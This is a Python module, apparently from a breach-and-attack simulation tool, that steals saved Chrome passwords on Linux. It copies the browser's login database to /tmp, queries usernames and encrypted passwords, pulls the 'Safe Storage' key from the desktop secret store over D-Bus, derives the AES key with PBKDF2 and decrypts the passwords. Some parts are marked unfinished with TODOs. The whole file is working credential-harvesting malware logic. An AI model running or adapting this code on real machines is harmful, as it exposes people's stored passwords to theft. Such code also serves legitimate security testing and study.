from typing import Collection
import logging
import os
import shutil
import sqlite3
from dataclasses import dataclass
from hashlib import pbkdf2_hmac
from itertools import chain
from pathlib import Path, PurePath
from typing import Iterator, Optional, Sequence, Set, Tuple

import secretstorage

from common.credentials import Credentials, Password, Username
from common.types import Event
from infection_monkey.utils.threading import interruptible_iter

from .decrypt import AESModeOfOperationCBC, decrypt_v80


@dataclass
class EncryptionConfig:
    iv: bytes
    length: int
    salt: bytes
    iterations: int


logger = logging.getLogger(__name__)

AES_BLOCK_SIZE = 16
ENC_CONFIG = EncryptionConfig(
    iv=b" " * 16,
    length=16,
    salt=b"saltysalt",
    iterations=1,
)

from .browser_credentials_database_path import BrowserCredentialsDatabasePath

DB_TEMP_PATH = "/tmp/chrome.db"
DB_SQL_STATEMENT = "SELECT username_value,password_value FROM logins"


class LinuxCredentialsDatabaseProcessor:
    def __init__(self):
        pass

    def __call__(
        self, interrupt: Event, database_paths: Collection[BrowserCredentialsDatabasePath]
    ) -> Collection[Credentials]:
        credentials = chain.from_iterable(map(self._process_database_path, database_paths))
        return list(interruptible_iter(credentials, interrupt))

    def _process_database_path(self, database_path: PurePath) -> Iterator[Credentials]:
        path = Path(database_path)
        if path.is_file():
            try:
                shutil.copyfile(path, DB_TEMP_PATH)

                conn = sqlite3.connect(DB_TEMP_PATH)
            except Exception:
                logger.exception(f"Error encounter while connecting to database: {path}")
                os.remove(DB_TEMP_PATH)
                return

            try:
                yield from self._process_login_data(conn)
            except Exception:
                logger.exception(f"Error encountered while processing database {database_path}")
            finally:
                conn.close()

            os.remove(DB_TEMP_PATH)

    def _process_login_data(self, connection: sqlite3.Connection) -> Iterator[Credentials]:
        for user, password in connection.execute(DB_SQL_STATEMENT):
            try:
                yield Credentials(
                    identity=Username(username=user), secret=self._get_password(password)
                )
            except Exception:
                continue

    def _get_password(self, password: str) -> Optional[Password]:
        if self._is_password_encrypted(password):
            try:
                return Password(password=self._decrypt_password(password))
            except Exception:
                return None

        return Password(password=password)

    def _is_password_encrypted(self, password: str):
        return password[:3] == b"v10" or password[:3] == b"v11"

    # TODO: Finish implementing this
    def _decrypt_password(self, password: str) -> str:
        decryption_keys = [key for key in _get_decryption_keys_from_storage()]
        try:
            for key in decryption_keys:
                return self._chrome_decrypt(password, key, init_vector=ENC_CONFIG.iv)

        except Exception:
            logger.exception("Failed to decrypt password")
            raise

        # If we get here, we failed to decrypt the password
        raise Exception("Password could not be decrypted.")

    def _chrome_decrypt(self, encrypted_value, key, init_vector):
        try:
            encrypted_value = encrypted_value[3:]
            aes = AESModeOfOperationCBC(key, iv=init_vector)
            cleartxt = b"".join(
                [
                    aes.decrypt(encrypted_value[i : i + AES_BLOCK_SIZE])
                    for i in range(0, len(encrypted_value), AES_BLOCK_SIZE)
                ]
            )
            return self._remove_padding(cleartxt)
        except UnicodeDecodeError:
            return decrypt_v80(encrypted_value, key)

    def _remove_padding(self, data):
        """
        Remove PKCS#7 padding
        """
        nb = data[-1]

        try:
            return data[:-nb]
        except Exception as err:
            logger.debug(err)
            return data


# Utilities for connecting to chrome secret storage


def _get_decryption_keys_from_storage() -> Iterator[bytes]:
    used_session_labels: Set[str] = set()
    for uid, session in _get_dbus_sessions():
        bus = _connect_to_dbus_session(uid, session)
        for collection in secretstorage.get_all_collections(bus):
            yield from _get_secrets_from_collection(collection, used_session_labels)


def _get_secrets_from_collection(
    collection: secretstorage.collection.Collection,
    used_session_labels: Set[str],
) -> Iterator[bytes]:
    if collection.is_locked():
        return

    label = collection.get_label()
    if label in used_session_labels:
        return
    used_session_labels.add(label)

    for item in collection.get_all_items():
        if item.get_label().endswith("Safe Storage"):
            yield _hash_decryption_key(item.get_secret())


def _hash_decryption_key(key: bytes):
    decryption_key = pbkdf2_hmac(
        hash_name="sha1",
        password=key,
        salt=ENC_CONFIG.salt,
        iterations=ENC_CONFIG.iterations,
        dklen=ENC_CONFIG.length,
    )
    return decryption_key


# TODO: Determine if we need to get the uid, DBUS_SESSION_BUS_ADDRESS from the environment
def _get_dbus_sessions() -> Iterator[Tuple[str, str]]:
    yield ("uid", "session")


# TODO: Determine if we need to connect to an existing session by uid, DBUS_SESSION_BUS_ADDRESS
def _connect_to_dbus_session(uid: str, session: str) -> secretstorage.dbus.SessionBus:
    return secretstorage.dbus_init()
